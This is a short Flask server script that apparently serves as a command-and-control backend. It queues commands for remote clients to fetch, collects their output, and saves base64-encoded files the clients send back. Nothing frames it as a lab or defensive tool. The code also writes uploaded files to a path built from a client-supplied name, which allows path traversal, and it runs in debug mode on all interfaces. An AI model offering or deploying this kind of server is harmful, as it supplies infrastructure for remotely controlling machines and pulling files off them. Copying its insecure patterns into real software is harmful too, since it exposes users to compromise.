from flask import Flask, request, jsonify
import base64
import os

app = Flask(__name__)

# A simple in-memory structure to store commands and results. For a production system, consider using a database.
commands_queue = []
results = {}

@app.route('/submit_command', methods=['POST'])
def submit_command():
    if request.is_json:
        data = request.get_json()
        command_id = str(len(commands_queue) + 1)
        commands_queue.append({"id": command_id, "cmd": data['cmd']})
        return jsonify({"id": command_id}), 200
    return jsonify({"error": "Request must be JSON"}), 400

@app.route('/command', methods=['GET'])
def get_command():
    if commands_queue:
        cmd = commands_queue.pop(0)
        return jsonify(cmd), 200
    return jsonify({"error": "No commands in queue"}), 404

@app.route('/submit_result', methods=['POST'])
def submit_result():
    if request.is_json:
        data = request.get_json()
        command_id = data['id']
        if 'fileName' in data:
            # This is a file download result
            file_content = base64.b64decode(data['result'])
            file_path = os.path.join("received_files", data['fileName'])
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, "wb") as file:
                file.write(file_content)
            results[command_id] = f"File {data['fileName']} received successfully"
        else:
            # This is a regular command result
            results[command_id] = data['result']
        return jsonify({"message": "Result received successfully"}), 200
    else:
        return jsonify({"error": "Request must be JSON"}), 400

@app.route('/result/<command_id>', methods=['GET'])
def get_result(command_id):
    if command_id in results:
        return jsonify({"id": command_id, "result": results[command_id]}), 200
    return jsonify({"error": "Result not found"}), 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
